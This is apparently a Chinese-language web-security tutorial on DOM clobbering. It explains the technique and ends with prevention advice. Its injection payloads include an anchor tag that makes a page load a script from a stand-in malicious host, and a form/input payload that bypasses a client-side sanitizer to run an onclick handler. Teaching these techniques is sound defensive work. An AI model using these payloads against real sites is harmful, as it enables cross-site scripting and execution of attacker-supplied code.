# DOM 覆盖（DOM Clobbering）

在本节中，我们将介绍什么是 DOM 覆盖，演示如何利用覆盖技术挖掘 DOM 漏洞，并提供减少 DOM 覆盖攻击风险的建议。

## 什么是 DOM 覆盖？

DOM 覆盖是一种通过向页面注入 HTML 来操纵 DOM，从而最终改变页面上 JavaScript 行为的技术。当无法实现 XSS，但你可以控制页面上某些 HTML，且 HTML 过滤器允许使用 `id` 或 `name` 属性时，DOM 覆盖尤其有用。最常见的 DOM 覆盖形式是使用锚点元素覆盖全局变量，随后应用程序以不安全的方式使用该变量（例如生成动态脚本 URL）。

“覆盖”（clobbering）一词源于你用 DOM 节点或 HTML 集合“覆盖”了全局变量或对象属性。例如，你可以使用 DOM 对象覆盖其他 JavaScript 对象，并利用 `submit` 等不安全名称来干扰表单实际的 `submit()` 函数。

## 如何利用 DOM 覆盖漏洞

JavaScript 开发者常用的一种模式是：

```javascript
var someObject = window.someObject || {};
```

如果你能控制页面上的部分 HTML，就可以用 DOM 节点（例如锚点）覆盖 `someObject` 引用。考虑以下代码：

```html
<script>
    window.onload = function(){
        let someObject = window.someObject || {};
        let script = document.createElement('script');
        script.src = someObject.url;
        document.body.appendChild(script);
    };
</script>
```

要利用此漏洞代码，你可以注入以下 HTML，用锚点元素覆盖 `someObject` 引用：

```html
<a id=someObject><a id=someObject name=url href=//malicious-website.com/evil.js>
```

由于两个锚点使用相同的 ID，DOM 会将它们组合成一个 DOM 集合。随后，DOM 覆盖向量会用此 DOM 集合覆盖 `someObject` 引用。最后一个锚点元素上的 `name` 属性用于覆盖 `someObject` 对象的 `url` 属性，隐式类型转换的 `toString()` 方法使用 `href` 指向外部脚本的属性值。（混淆：`cid:`伪协议保持载荷不被 URL 编码，可用来 `"` 属性值逃逸）

另一种常见技术是使用 `form` 元素配合 `input` 等元素来覆盖 DOM 属性。例如，覆盖 `attributes` 属性可以绕过在其逻辑中使用该属性的客户端过滤器。

`htmlJanitor` 过滤器：

```js
    ...
    // Sanitize attributes
    for (var a = 0; a < node.attributes.length; a += 1) {
        var attr = node.attributes[a];

        if (shouldRejectAttr(attr, allowedAttrs, node)) {
            node.removeAttribute(attr.name);
            // Shift the array to continue looping.
            a = a - 1;
        }
    }
    ...
```

虽然过滤器会枚举 `attributes` 属性，但由于该属性已被 DOM 节点覆盖，过滤器实际上不会移除任何属性。因此，你可以注入通常会被过滤掉的恶意属性。例如，考虑以下注入：

```html
<form onclick=alert(1)><input id=attributes>Click me
```

在此场景中，客户端过滤器会遍历 DOM 并遇到一个白名单中的 `form` 元素。通常，过滤器会遍历 `form` 元素的 `attributes` 属性并移除任何黑名单中的属性。然而，由于 `attributes` 属性已被 `input` 元素使用 `id` 覆盖，过滤器转而遍历 `input` 元素。由于 `input` 元素的 `length` 未定义，过滤器 `for` 循环的条件（例如 `i<element.attributes.length`）无法满足，过滤器直接跳过该元素继续处理下一个。这导致 `onclick` 事件完全被过滤器忽略，从而允许在浏览器中调用 `alert()` 函数。

## 如何防止 DOM 覆盖攻击

简单来说，你可以通过实施检查来确保对象或函数符合预期来防止 DOM 覆盖攻击。例如，你可以检查 DOM 节点的 `attributes` 属性是否是 `NamedNodeMap` 的实例。这样可以确保该属性是真正的 `attributes` 属性，而非被覆盖的 HTML 元素。

同时，应避免编写使用全局变量结合逻辑或运算符 `||` 的代码，因为这可能导致 DOM 覆盖漏洞。

总结如下：

- 检查对象和函数是否合法。如果正在过滤 DOM，请确保检查对象或函数是否为 DOM 节点。
- 避免不良代码模式。应避免使用全局变量结合逻辑或运算符的模式。
- 使用经过充分测试的库，例如已考虑 DOM 覆盖漏洞的 DOMPurify。
